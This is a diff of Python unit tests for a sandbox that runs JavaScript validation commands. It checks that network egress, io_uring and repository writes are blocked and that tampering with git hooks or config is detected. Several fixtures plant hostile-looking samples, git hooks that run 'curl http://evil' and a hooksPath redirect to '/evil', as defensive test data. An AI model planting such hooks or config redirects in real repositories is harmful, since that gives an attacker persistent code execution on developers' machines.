@@ -1,11 +1,13 @@
 from __future__ import annotations
 
+import errno
 import importlib.util
 import io
 import json
 import multiprocessing
 import os
 import shutil
+import socket
 import subprocess
 import sys
 import tempfile
@@ -34,6 +36,32 @@ def load_apply_module():
 
 APPLY_MODULE = load_apply_module()
 VALIDATION_OUTPUT_SHA256 = APPLY_MODULE.sha256_bytes(b"validation passed\n")
+
+# A faithful, minimal *real Node* program installed at the vitest.mjs runner
+# path.  It is deliberately named by the containment property it exercises
+# ("js_runner"), NOT "vitest": these always-on tests prove the js_validation
+# PROFILE (spawning permitted, INET denied and inherited by children, repo
+# writes denied), independent of upstream Vitest internals.  The optional
+# env-gated real-upstream-vitest smoke test lives separately.
+JS_VALIDATION_RUNNER_SOURCE = (REPO_ROOT / "tests/fixtures/codexqb_js_runner.mjs").read_text(
+    encoding="utf-8"
+)
+
+
+def write_js_runner_fixture(root: Path, directives: list[str]) -> None:
+    """Install the real-Node js_runner at the vitest.mjs path plus target files."""
+
+    runner_dir = root / "node_modules" / "vitest"
+    runner_dir.mkdir(parents=True, exist_ok=True)
+    (runner_dir / "vitest.mjs").write_text(JS_VALIDATION_RUNNER_SOURCE, encoding="utf-8")
+    (root / "vitest.config.ts").write_text(
+        "export default { test: { include: ['tests/**/*.test.ts'] } };\n",
+        encoding="utf-8",
+    )
+    tests_dir = root / "tests"
+    tests_dir.mkdir(exist_ok=True)
+    for name in directives:
+        (tests_dir / f"{name}.test.ts").write_text(f"// DIRECTIVE: {name}\n", encoding="utf-8")
 
 
 def append_event_worker(run_dir: str, index: int, barrier) -> None:
@@ -3457,7 +3485,7 @@ class ApplyRunTests(unittest.TestCase):
             root = Path(temp_dir)
             self.write_apply_fixture(root)
             (root / "src").mkdir()
-            (root / "tests").mkdir()
+            (root / "tests").mkdir(exist_ok=True)
             (root / "src" / "feature_1_1.py").write_text("VALUE = 'before'\n", encoding="utf-8")
             (root / "src" / "outside.py").write_text("VALUE = 'outside-before'\n", encoding="utf-8")
             (root / "tests" / "test_feature_1_1.py").write_text(
@@ -4218,7 +4246,7 @@ class ApplyRunTests(unittest.TestCase):
             )
             self.assertIn(planned, text)
             subplan.write_text(text.replace(planned, cwd_bound, 1), encoding="utf-8")
-            (root / "tests").mkdir()
+            (root / "tests").mkdir(exist_ok=True)
             run_dir, task_id = self.prepare_task_for_validation(
                 root,
                 "from pathlib import Path\n"
@@ -4425,6 +4453,654 @@ class ApplyRunTests(unittest.TestCase):
             self.assertFalse(result.timed_out)
             self.assertEqual(result.termination_reason, "exited")
             self.assertEqual(result.exit_code, 0)
+
+    def _js_expected_network_proof(self) -> str:
+        return (
+            APPLY_MODULE.ENFORCED_SEATBELT_DENY_NETWORK
+            if sys.platform == "darwin"
+            else APPLY_MODULE.ENFORCED_SECCOMP_INET_DENY
+        )
+
+    def _js_expected_host_sandbox_proof(self) -> str:
+        if sys.platform == "darwin":
+            return APPLY_MODULE.ENFORCED_SEATBELT_REPO_WRITE_DENY
+        # On Linux a JS validation only executes when Landlock is available
+        # (otherwise it fails closed, see C-B), so a completed run always attests
+        # to Landlock repo-write prevention.
+        return APPLY_MODULE.ENFORCED_LANDLOCK_REPO_WRITE_DENY
+
+    def _run_js_validation(self, root: Path, target_rel: str, timeout: int = 60):
+        return APPLY_MODULE.run_bounded_validation_process(
+            ["vitest", "run", target_rel],
+            cwd=root,
+            root=root,
+            timeout_seconds=timeout,
+        )
+
+    def test_js_validation_pure_run_passes_and_records_network_enforcement(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            write_js_runner_fixture(root, ["pure"])
+            result = self._run_js_validation(root, "tests/pure.test.ts")
+            detail = (result.stdout + result.stderr).decode("utf-8", "replace")
+            self.assertEqual(result.exit_code, 0, detail)
+            self.assertIn("JS_RUNNER_PURE_PASS", detail)
+            self.assertEqual(result.network_enforcement_proof, self._js_expected_network_proof())
+
+    def test_js_validation_permits_bounded_child_process_spawning(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            write_js_runner_fixture(root, ["spawngit"])
+            result = self._run_js_validation(root, "tests/spawngit.test.ts")
+            detail = (result.stdout + result.stderr).decode("utf-8", "replace")
+            self.assertEqual(result.exit_code, 0, detail)
+            self.assertIn("JS_RUNNER_SPAWN_GIT_OK", detail)
+
+    def test_js_validation_denies_outbound_inet_socket(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            write_js_runner_fixture(root, ["outbound"])
+            result = self._run_js_validation(root, "tests/outbound.test.ts")
+            detail = (result.stdout + result.stderr).decode("utf-8", "replace")
+            self.assertEqual(result.exit_code, 42, detail)
+            self.assertIn("JS_RUNNER_SOCKET_DENIED", detail)
+            self.assertNotIn("JS_RUNNER_SOCKET_CONNECTED", detail)
+
+    def test_js_validation_network_denial_is_inherited_by_spawned_children(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            write_js_runner_fixture(root, ["childnet"])
+            result = self._run_js_validation(root, "tests/childnet.test.ts")
+            detail = (result.stdout + result.stderr).decode("utf-8", "replace")
+            self.assertEqual(result.exit_code, 44, detail)
+            self.assertIn("JS_RUNNER_CHILD_NET_DENIED", detail)
+
+    def test_js_validation_rejects_nonexistent_and_swapped_runner(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            # No node_modules/vitest/vitest.mjs present -> descriptor resolution
+            # fails closed rather than executing an absent runner.
+            (root / "tests").mkdir(exist_ok=True)
+            (root / "tests" / "pure.test.ts").write_text("// DIRECTIVE: pure\n", encoding="utf-8")
+            with self.assertRaises(ValueError):
+                self._run_js_validation(root, "tests/pure.test.ts")
+
+    def test_js_validation_rejects_symlinked_runner(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir, tempfile.TemporaryDirectory() as outside_dir:
+            root = Path(temp_dir)
+            (root / "tests").mkdir(exist_ok=True)
+            (root / "tests" / "pure.test.ts").write_text("// DIRECTIVE: pure\n", encoding="utf-8")
+            (root / "vitest.config.ts").write_text("export default {};\n", encoding="utf-8")
+            outside_runner = Path(outside_dir) / "vitest.mjs"
+            outside_runner.write_text(JS_VALIDATION_RUNNER_SOURCE, encoding="utf-8")
+            (root / "node_modules").mkdir()
+            (root / "node_modules" / "vitest").mkdir()
+            # Symlink the runner to a file outside the repo: the O_NOFOLLOW walk
+            # must refuse to follow it.
+            (root / "node_modules" / "vitest" / "vitest.mjs").symlink_to(outside_runner)
+            with self.assertRaises(ValueError):
+                self._run_js_validation(root, "tests/pure.test.ts")
+
+    def test_command_is_safe_gates_target_existence_by_context(self) -> None:
+        # I-2 is scoped: create-time / plan-first validation accepts a well-formed
+        # but not-yet-written ("proposed") target, while execute-time validation
+        # (require_target_exists=True) rejects it — closing I-2 at the point of use
+        # without regressing the plan-first workflow.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            (root / "tests").mkdir()
+            proposed = {
+                "id": "VAL-01",
+                "argv": [
+                    "python3", "-B", "-m", "pytest", "-p", "no:cacheprovider", "tests/missing.py", "-q"
+                ],
+                "cwd": ".",
+                "expected_exit_code": 0,
+                "timeout_seconds": 120,
+                "network": "deny",
+                "probe_tier": 1,
+            }
+            self.assertTrue(APPLY_MODULE.command_is_safe(proposed, root))
+            self.assertFalse(APPLY_MODULE.command_is_safe(proposed, root, require_target_exists=True))
+            # Once the target exists, the execute-time gate accepts it.
+            (root / "tests" / "missing.py").write_text("def test_ok():\n    assert True\n", encoding="utf-8")
+            self.assertTrue(APPLY_MODULE.command_is_safe(proposed, root, require_target_exists=True))
+            # A vitest command is gated the same way.
+            vitest = dict(proposed, argv=["vitest", "run", "tests/x.test.ts"])
+            self.assertTrue(APPLY_MODULE.command_is_safe(vitest, root))
+            self.assertFalse(APPLY_MODULE.command_is_safe(vitest, root, require_target_exists=True))
+
+    def test_js_validation_prelaunch_inode_swap_is_detected(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            (root / "tests").mkdir(exist_ok=True)
+            target = root / "tests" / "swap.test.ts"
+            target.write_text("// DIRECTIVE: pure\n", encoding="utf-8")
+            # The executor holds a descriptor on the validated inode so it cannot
+            # be recycled; hold one here too so the swapped-in file is guaranteed
+            # a distinct inode even on filesystems that recycle inode numbers.
+            held = os.open(str(target), os.O_RDONLY)
+            cwd_fd = APPLY_MODULE._open_validation_cwd_fd(
+                root=root, cwd=root, root_fd=None, normalized_cwd="."
+            )
+            try:
+                before = os.fstat(held)
+                bindings = [("tests/swap.test.ts", before.st_dev, before.st_ino)]
+                # Unchanged inode: recheck passes.
+                APPLY_MODULE._recheck_vitest_inode_bindings(cwd_fd, bindings)
+                # Rename a *different* file over the path (the held fd pins the
+                # original inode, so the swapped-in inode differs).
+                other = root / "tests" / "other.ts"
+                other.write_text("// swapped\n", encoding="utf-8")
+                os.rename(str(other), str(target))
+                with self.assertRaises(ValueError):
+                    APPLY_MODULE._recheck_vitest_inode_bindings(cwd_fd, bindings)
+            finally:
+                os.close(cwd_fd)
+                os.close(held)
+
+    @unittest.skipUnless(
+        os.environ.get("CODEXQB_JS_REAL_VITEST") == "1",
+        "real upstream Vitest smoke is env-gated (set CODEXQB_JS_REAL_VITEST=1); it installs "
+        "vitest into a temp cache and needs network + npm",
+    )
+    def test_js_validation_real_upstream_vitest_runs_under_profile(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            (root / "package.json").write_text('{"name":"proof","private":true}\n', encoding="utf-8")
+            install = subprocess.run(
+                ["npm", "install", "--no-audit", "--no-fund", "--silent", "vitest@2"],
+                cwd=root,
+                capture_output=True,
+                text=True,
+            )
+            self.assertEqual(install.returncode, 0, install.stdout + install.stderr)
+            self.assertTrue((root / "node_modules" / "vitest" / "vitest.mjs").is_file())
+            (root / "vitest.config.ts").write_text(
+                "import { defineConfig } from 'vitest/config';\n"
+                "export default defineConfig({ test: { include: ['tests/**/*.test.ts'], "
+                "passWithNoTests: false } });\n",
+                encoding="utf-8",
+            )
+            (root / "tests").mkdir(exist_ok=True)
+            (root / "tests" / "real.test.ts").write_text(
+                "import { test, expect } from 'vitest';\n"
+                "test('real upstream vitest under the js_validation profile', () => {\n"
+                "  expect(1 + 1).toBe(2);\n"
+                "});\n",
+                encoding="utf-8",
+            )
+            result = APPLY_MODULE.run_bounded_validation_process(
+                ["vitest", "run", "tests/real.test.ts"],
+                cwd=root,
+                root=root,
+                timeout_seconds=180,
+            )
+            detail = (result.stdout + result.stderr).decode("utf-8", "replace")
+            self.assertEqual(result.exit_code, 0, detail)
+            self.assertIn("Test Files", detail)  # real Vitest reporter output
+            self.assertIn("1 passed", detail)
+            self.assertEqual(result.network_enforcement_proof, self._js_expected_network_proof())
+            # Vitest must not have written its results cache into the repo.
+            self.assertFalse((root / "node_modules" / ".vite").exists())
+
+    @staticmethod
+    def _interpret_seccomp(instrs, nr, arch, arg0):
+        # Minimal classic-BPF interpreter over seccomp_data {nr@0, arch@4, args0@16}.
+        acc = 0
+        pc = 0
+        data = {0: nr, 4: arch, 16: arg0}
+        for _ in range(1000):
+            it = instrs[pc]
+            if it.code == 0x20:  # LD abs
+                acc = data.get(it.k, 0)
+                pc += 1
+            elif it.code == 0x15:  # JEQ
+                pc += (it.jt if acc == it.k else it.jf) + 1
+            elif it.code == 0x45:  # JSET
+                pc += (it.jt if (acc & it.k) else it.jf) + 1
+            elif it.code == 0x06:  # RET
+                if it.k == 0x7FFF0000:
+                    return "ALLOW"
+                if it.k == 0x80000000:
+                    return "KILL"
+                if (it.k & 0xFFFF0000) == 0x00050000:
+                    return ("ERRNO", it.k & 0xFFFF)
+                return ("RET", it.k)
+            else:
+                return "BADOP"
+        return "LOOP"
+
+    def test_js_seccomp_denies_iouring_afunix_and_inet_egress(self) -> None:
+        # C1 (io_uring) + H1 (AF_UNIX): the js_validation filter must deny every
+        # egress path with EACCES while leaving spawning + fork/thread IPC intact.
+        eacces = ("ERRNO", errno.EACCES)
+        for machine, arch, socket_nr in (("x86_64", 0xC000003E, 41), ("aarch64", 0xC00000B7, 198)):
+            with mock.patch.object(APPLY_MODULE.sys, "platform", "linux"), mock.patch.object(
+                APPLY_MODULE.os, "uname", return_value=mock.Mock(machine=machine)
+            ):
+                _, instrs = APPLY_MODULE._js_validation_seccomp_spec()
+            # Egress denied:
+            for domain in (1, 2, 10):  # AF_UNIX, AF_INET, AF_INET6
+                self.assertEqual(self._interpret_seccomp(instrs, socket_nr, arch, domain), eacces, (machine, domain))
+            for nr in (425, 426, 427):  # io_uring_setup / enter / register
+                self.assertEqual(self._interpret_seccomp(instrs, nr, arch, 0), eacces, (machine, nr))
+            # Legit paths allowed (spawning + kernel-local + fork-IPC):
+            self.assertEqual(self._interpret_seccomp(instrs, socket_nr, arch, 16), "ALLOW")  # AF_NETLINK
+            clone_nr = 56 if machine == "x86_64" else 220
+            socketpair_nr = 53 if machine == "x86_64" else 199
+            execve_nr = 59 if machine == "x86_64" else 221
+            for nr in (clone_nr, socketpair_nr, execve_nr):
+                self.assertEqual(self._interpret_seccomp(instrs, nr, arch, 0), "ALLOW", (machine, nr))
+            # Wrong arch is killed, not reinterpreted:
+            self.assertEqual(self._interpret_seccomp(instrs, socket_nr, 0xDEADBEEF, 2), "KILL")
+
+    def test_validation_control_surface_digest_detects_git_writes(self) -> None:
+        # C2: a .git/ mutation (hook/config injection) changes the validation
+        # control-surface digest, so execute_planned_validation fails closed even
+        # if Landlock did not preventively deny the write.  .codexqb/ (the tool's
+        # own tree) is deliberately excluded and does not perturb the digest.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            hooks = root / ".git" / "hooks"
+            hooks.mkdir(parents=True)
+            (hooks / "pre-push").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+            baseline = APPLY_MODULE._validation_control_surface_digest(root)
+            # In-place hook rewrite is detected.
+            (hooks / "pre-push").write_text("#!/bin/sh\ncurl http://evil\n", encoding="utf-8")
+            self.assertNotEqual(APPLY_MODULE._validation_control_surface_digest(root), baseline)
+            # A new .git/config (core.hooksPath) is detected.
+            (root / ".git" / "config").write_text("[core]\n\thooksPath = /evil\n", encoding="utf-8")
+            mutated = APPLY_MODULE._validation_control_surface_digest(root)
+            self.assertNotEqual(mutated, baseline)
+            # Writes under the tool's own .codexqb/ tree do NOT perturb the digest.
+            (root / ".codexqb").mkdir()
+            (root / ".codexqb" / "state.json").write_text("{}\n", encoding="utf-8")
+            self.assertEqual(APPLY_MODULE._validation_control_surface_digest(root), mutated)
+
+    def test_validation_control_surface_digest_resolves_worktree_gitfile(self) -> None:
+        # C-A: a linked worktree's `.git` is a GITFILE pointing at an EXTERNAL
+        # gitdir `<common>/worktrees/<name>` that lives OUTSIDE `root`.  Its
+        # hooks/config — and the SHARED common gitdir's hooks — still execute
+        # against this tree, so a write to either must perturb the control-surface
+        # digest even though it is outside the repo root.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base = Path(temp_dir)
+            common_git = base / "super" / ".git"
+            worktree_git = common_git / "worktrees" / "wt1"
+            worktree_git.mkdir(parents=True)
+            (common_git / "hooks").mkdir(parents=True)
+            (common_git / "hooks" / "pre-push").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+            (worktree_git / "HEAD").write_text("ref: refs/heads/wt\n", encoding="utf-8")
+            root = base / "wt1"
+            root.mkdir()
+            (root / ".git").write_text(f"gitdir: {worktree_git}\n", encoding="utf-8")
+
+            resolved = {
+                os.path.realpath(p)
+                for p in APPLY_MODULE._resolve_git_control_surface_dirs(APPLY_MODULE.lexical_absolute(root))
+            }
+            self.assertIn(os.path.realpath(worktree_git), resolved)
+            self.assertIn(os.path.realpath(common_git), resolved)
+
+            baseline = APPLY_MODULE._validation_control_surface_digest(root)
+            # A hook planted in the SHARED common gitdir (outside root) is caught.
+            (common_git / "hooks" / "pre-push").write_text(
+                "#!/bin/sh\ncurl http://evil\n", encoding="utf-8"
+            )
+            after_common = APPLY_MODULE._validation_control_surface_digest(root)
+            self.assertNotEqual(after_common, baseline)
+            # A write into the worktree-private gitdir is caught too.
+            (worktree_git / "config").write_text("[core]\n\thooksPath = /evil\n", encoding="utf-8")
+            after_wt = APPLY_MODULE._validation_control_surface_digest(root)
+            self.assertNotEqual(after_wt, after_common)
+            # Re-pointing the `.git` gitfile itself is caught directly.
+            (root / ".git").write_text(f"gitdir: {common_git}\n", encoding="utf-8")
+            self.assertNotEqual(APPLY_MODULE._validation_control_surface_digest(root), after_wt)
+
+    def test_validation_control_surface_digest_resolves_submodule_gitfile(self) -> None:
+        # C-A: a submodule's `.git` is a GITFILE pointing at `<super>/.git/modules/
+        # <name>` (its own gitdir with its own hooks, no shared worktrees/ parent).
+        # A hook planted there is caught by the digest.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base = Path(temp_dir)
+            module_git = base / "super" / ".git" / "modules" / "sub"
+            (module_git / "hooks").mkdir(parents=True)
+            (module_git / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
+            root = base / "super" / "sub"
+            root.mkdir(parents=True)
+            (root / ".git").write_text(f"gitdir: {module_git}\n", encoding="utf-8")
+
+            resolved = {
+                os.path.realpath(p)
+                for p in APPLY_MODULE._resolve_git_control_surface_dirs(APPLY_MODULE.lexical_absolute(root))
+            }
+            self.assertEqual(resolved, {os.path.realpath(module_git)})
+
+            baseline = APPLY_MODULE._validation_control_surface_digest(root)
+            (module_git / "hooks" / "pre-commit").write_text(
+                "#!/bin/sh\ncurl http://evil\n", encoding="utf-8"
+            )
+            self.assertNotEqual(APPLY_MODULE._validation_control_surface_digest(root), baseline)
+
+    @unittest.skipUnless(sys.platform == "darwin", "seatbelt profile is macOS-specific")
+    def test_macos_js_profile_denies_external_worktree_gitdir(self) -> None:
+        # C-A: when `.git` is a gitfile, the seatbelt profile must PREVENTIVELY deny
+        # writes to the external gitdir(s), not just the repo root.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base = Path(temp_dir)
+            common_git = base / "super" / ".git"
+            worktree_git = common_git / "worktrees" / "wt1"
+            worktree_git.mkdir(parents=True)
+            root = base / "wt1"
+            root.mkdir()
+            (root / ".git").write_text(f"gitdir: {worktree_git}\n", encoding="utf-8")
+            profile = APPLY_MODULE._macos_js_validation_profile(root)
+            self.assertIn("(deny network*)", profile)
+            self.assertIn(f'(subpath "{os.path.realpath(root)}")', profile)
+            self.assertIn(f'(subpath "{os.path.realpath(worktree_git)}")', profile)
+            self.assertIn(f'(subpath "{os.path.realpath(common_git)}")', profile)
+
+    def test_validation_control_surface_digest_fails_closed_when_walk_exceeds_cap(self) -> None:
+        # M-A: an unbounded control-surface walk is a controller-side DoS.  With the
+        # path cap forced to 1, a multi-entry `.git/` must FAIL CLOSED (unverifiable)
+        # rather than silently truncate — no partial digest can pass the check.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            hooks = root / ".git" / "hooks"
+            hooks.mkdir(parents=True)
+            for i in range(5):
+                (hooks / f"h{i}").write_text("x\n", encoding="utf-8")
+            with mock.patch.object(APPLY_MODULE, "VALIDATION_CONTROL_SURFACE_MAX_PATHS", 1):
+                with self.assertRaises(ValueError) as ctx:
+                    APPLY_MODULE._validation_control_surface_digest(root)
+            self.assertIn("validation_control_surface_unverifiable", str(ctx.exception))
+
+    def test_validation_control_surface_digest_uses_authoritative_commondir(self) -> None:
+        # R1: a linked worktree's shared gitdir is `<gitdir>/commondir`
+        # ($GIT_COMMON_DIR), which git can point at a NON-STANDARD location a
+        # `parent.parent` structural guess would miss.  The digest must walk, and
+        # the macOS seatbelt must deny, exactly where `commondir` points.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base = Path(temp_dir)
+            structural_common = base / "super" / ".git"
+            worktree_git = structural_common / "worktrees" / "wt1"
+            worktree_git.mkdir(parents=True)
+            # commondir points somewhere OTHER than worktree_git.parent.parent.
+            attacker_common = base / "attacker_common"
+            (attacker_common / "hooks").mkdir(parents=True)
+            (worktree_git / "commondir").write_text(f"{attacker_common}\n", encoding="utf-8")
+            root = base / "wt1"
+            root.mkdir()
+            (root / ".git").write_text(f"gitdir: {worktree_git}\n", encoding="utf-8")
+
+            resolved = {
+                os.path.realpath(p)
+                for p in APPLY_MODULE._resolve_git_control_surface_dirs(APPLY_MODULE.lexical_absolute(root))
+            }
+            # The authoritative commondir is covered; the structural guess is NOT
+            # added when commondir is present.
+            self.assertIn(os.path.realpath(attacker_common), resolved)
+            self.assertNotIn(os.path.realpath(structural_common), resolved)
+
+            baseline = APPLY_MODULE._validation_control_surface_digest(root)
+            (attacker_common / "hooks" / "pre-push").write_text(
+                "#!/bin/sh\ncurl http://evil\n", encoding="utf-8"
+            )
+            self.assertNotEqual(APPLY_MODULE._validation_control_surface_digest(root), baseline)
+            if sys.platform == "darwin":
+                profile = APPLY_MODULE._macos_js_validation_profile(root)
+                self.assertIn(f'(subpath "{os.path.realpath(attacker_common)}")', profile)
+
+    def test_validation_control_surface_digest_falls_back_when_commondir_absent(self) -> None:
+        # R1: with no `commondir` file, the structural `<common>/worktrees/<name>`
+        # -> `<common>` guess still covers the shared gitdir.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base = Path(temp_dir)
+            common_git = base / "super" / ".git"
+            worktree_git = common_git / "worktrees" / "wt1"
+            worktree_git.mkdir(parents=True)  # no commondir file
+            root = base / "wt1"
+            root.mkdir()
+            (root / ".git").write_text(f"gitdir: {worktree_git}\n", encoding="utf-8")
+            resolved = {
+                os.path.realpath(p)
+                for p in APPLY_MODULE._resolve_git_control_surface_dirs(APPLY_MODULE.lexical_absolute(root))
+            }
+            self.assertIn(os.path.realpath(common_git), resolved)
+
+    def test_control_surface_entry_fails_closed_before_reading_oversized_file(self) -> None:
+        # R2: a single file larger than the remaining byte budget must fail closed
+        # BEFORE it is opened for reading (no overshoot of the cap by its own size).
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            hooks = root / ".git" / "hooks"
+            hooks.mkdir(parents=True)
+            big = hooks / "big.bin"
+            big.write_bytes(b"x" * (2 * 1024 * 1024))  # 2 MiB
+            opened: list[str] = []
+            real_open = open
+
+            def _spy_open(path, *args, **kwargs):
+                opened.append(str(path))
+                return real_open(path, *args, **kwargs)
+
+            with mock.patch.object(APPLY_MODULE, "VALIDATION_CONTROL_SURFACE_MAX_BYTES", 1024), \
+                    mock.patch("builtins.open", _spy_open):
+                with self.assertRaises(ValueError) as ctx:
+                    APPLY_MODULE._validation_control_surface_digest(root)
+            self.assertIn("validation_control_surface_unverifiable", str(ctx.exception))
+            self.assertFalse(
+                any(str(big) in path for path in opened),
+                "oversized file was opened/read before the budget check fired",
+            )
+
+    def test_js_validation_denies_afunix_egress(self) -> None:
+        # H1: connecting an AF_UNIX socket to a REAL local listener (proxy/
+        # resolver/docker.sock exfil route) is denied by the profile on every
+        # platform.  The listener lives OUTSIDE the repo so only the network
+        # operation — not a repo write — is under test.
+        with tempfile.TemporaryDirectory() as temp_dir, tempfile.TemporaryDirectory() as sock_dir:
+            root = Path(temp_dir)
+            write_js_runner_fixture(root, ["afunix"])
+            sock_path = os.path.join(sock_dir, "srv.sock")
+            server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+            try:
+                server.bind(sock_path)
+                server.listen(1)
+                (root / "afunix_target.txt").write_text(sock_path, encoding="utf-8")
+                result = self._run_js_validation(root, "tests/afunix.test.ts")
+                detail = (result.stdout + result.stderr).decode("utf-8", "replace")
+                self.assertEqual(result.exit_code, 48, detail)
+                self.assertIn("JS_RUNNER_AFUNIX_DENIED", detail)
+                self.assertNotIn("JS_RUNNER_AFUNIX_CONNECTED", detail)
+            finally:
+                server.close()
+
+    @unittest.skipUnless(sys.platform.startswith("linux"), "io_uring is a Linux-only kernel feature")
+    def test_js_validation_denies_iouring_egress(self) -> None:
+        # C1: io_uring_setup must fail EACCES under the profile (via a spawned
+        # python3 child that inherits the seccomp filter), so a target cannot use
+        # IORING_OP_SOCKET/CONNECT/SEND to reach the network with no socket() call.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            write_js_runner_fixture(root, ["iouring"])
+            result = self._run_js_validation(root, "tests/iouring.test.ts")
+            detail = (result.stdout + result.stderr).decode("utf-8", "replace")
+            self.assertIn("JS_RUNNER_IOURING_DENIED", detail, detail)
+            self.assertNotIn("JS_RUNNER_IOURING_CREATED", detail, detail)
+            self.assertNotIn("JS_RUNNER_IOURING_KILLED", detail, detail)  # EACCES, not KILL
+            self.assertEqual(result.exit_code, 50, detail)
+
+    def test_execute_planned_validation_js_git_hook_write_is_prevented_or_caught(self) -> None:
+        # C2 end-to-end: a target rewriting .git/hooks/pre-push is either
+        # PREVENTED (macOS seatbelt / Linux Landlock -> hook unchanged) or CAUGHT
+        # (Landlock unavailable -> control-surface digest -> mutated_repository).
+        # Either way no signed success receipt is produced over a tampered repo.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            run_dir, task_id = self.prepare_js_task_for_validation(root, "gitwrite", git_init=True)
+            hooks = root / ".git" / "hooks"
+            hooks.mkdir(parents=True, exist_ok=True)
+            pre_push = hooks / "pre-push"
+            original = "#!/bin/sh\nexit 0\n"
+            pre_push.write_text(original, encoding="utf-8")
+            try:
+                result = APPLY_MODULE.execute_planned_validation(run_dir, task_id, "VAL-01", "controller")
+            except ValueError as exc:
+                self.assertIn("validation_command_mutated_repository", str(exc))
+                # A rejected validation must not leave a published success receipt.
+                self.assertEqual(list((run_dir / task_id).glob("Validation-Receipt-*.json")), [])
+            else:
+                # Prevented: the hook is byte-for-byte unchanged.
+                self.assertEqual(pre_push.read_text(encoding="utf-8"), original)
+                self._published_js_receipt(run_dir, task_id, result)
+
+    @unittest.skipUnless(sys.platform.startswith("linux"), "Landlock-unavailable path is Linux-specific")
+    def test_execute_planned_validation_js_fails_closed_when_landlock_unavailable(self) -> None:
+        # C-B: the JS profile PERMITS spawning, so without Landlock a target could
+        # forge a MAC'd success receipt into .codexqb/ BEFORE the post-hoc digest
+        # ever runs — the digest backstop is therefore NOT a sufficient substitute.
+        # With Landlock forced unavailable the validation must FAIL CLOSED: refuse
+        # to execute (secure_js_validation_isolation_not_supported), run the child
+        # process ZERO times, and publish no receipt.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            # Containment REFUSES before producing any launchable argv: with no
+            # contained command, the validation child provably cannot start.
+            with mock.patch.object(APPLY_MODULE, "_linux_landlock_abi", return_value=0):
+                with self.assertRaises(ValueError) as unit_ctx:
+                    APPLY_MODULE._validation_containment_command(
+                        ["/usr/bin/node", "vitest.mjs"], js_profile=True, root=root
+                    )
+            self.assertIn("secure_js_validation_isolation_not_supported", str(unit_ctx.exception))
+
+            # End to end: execute_planned_validation fails closed and publishes no receipt.
+            run_dir, task_id = self.prepare_js_task_for_validation(root, "gitwrite", git_init=True)
+            with mock.patch.object(APPLY_MODULE, "_linux_landlock_abi", return_value=0):
+                with self.assertRaises(ValueError) as ctx:
+                    APPLY_MODULE.execute_planned_validation(run_dir, task_id, "VAL-01", "controller")
+            self.assertIn("secure_js_validation_isolation_not_supported", str(ctx.exception))
+            self.assertEqual(list((run_dir / task_id).glob("Validation-Receipt-*.json")), [])
+
+    def prepare_js_task_for_validation(
+        self, root: Path, directive: str, *, git_init: bool = False
+    ) -> tuple[Path, str]:
+        """Apply-run fixture whose planned validation command is the vitest runner."""
+
+        self.write_apply_fixture(root)
+        write_js_runner_fixture(root, [directive])
+        subplan = root / "Planner-docs" / "Faz-1-Plans" / "Faz1.1-local-contract.md"
+        text = subplan.read_text(encoding="utf-8")
+        pytest_argv = (
+            '      "argv": ["python3", "-B", "-m", "pytest", "-p", '
+            '"no:cacheprovider", "tests/test_feature_1_1.py", "-q"],'
+        )
+        vitest_argv = f'      "argv": ["vitest", "run", "tests/{directive}.test.ts"],'
+        self.assertIn(pytest_argv, text)
+        subplan.write_text(text.replace(pytest_argv, vitest_argv, 1), encoding="utf-8")
+
+        if git_init:
+            # A real, committed .git so the repository-evidence probe succeeds
+            # (valid HEAD for the receipt code-snapshot) and the control-surface
+            # digest has a valid VCS baseline to compare against.
+            self.init_git_repo(root)
+            git_env = {
+                **os.environ,
+                "GIT_AUTHOR_NAME": "t",
+                "GIT_AUTHOR_EMAIL": "t@example.invalid",
+                "GIT_COMMITTER_NAME": "t",
+                "GIT_COMMITTER_EMAIL": "t@example.invalid",
+            }
+            subprocess.run(["git", "-C", str(root), "add", "-A"], check=True, capture_output=True, text=True, env=git_env)
+            subprocess.run(
+                ["git", "-C", str(root), "commit", "--no-verify", "-m", "init"],
+                check=True, capture_output=True, text=True, env=git_env,
+            )
+
+        run_dir = Path(self.create_apply_run(root, "subagent_serial")["run_dir"])
+        task_id = self.first_task_id(run_dir)
+        APPLY_MODULE.prepare_dispatch_packet(run_dir, task_id, "implementer", "controller")
+        APPLY_MODULE.record_agent_status(
+            run_dir, task_id, "implementer", "validation-impl", "spawned", "controller"
+        )
+        APPLY_MODULE.transition_task_state(run_dir, task_id, "IMPLEMENTING", "validation-impl")
+        (root / "src").mkdir(exist_ok=True)
+        (root / "src" / "feature_1_1.py").write_text("VALUE = 1\n", encoding="utf-8")
+        APPLY_MODULE.normalize_writer_report(
+            run_dir,
+            task_id,
+            "implementer",
+            "validation-impl",
+            {
+                "status": "DONE",
+                "task_id": task_id,
+                "implementer_agent_id": "validation-impl",
+                "files_changed": ["src/feature_1_1.py", f"tests/{directive}.test.ts"],
+                "concerns": [],
+            },
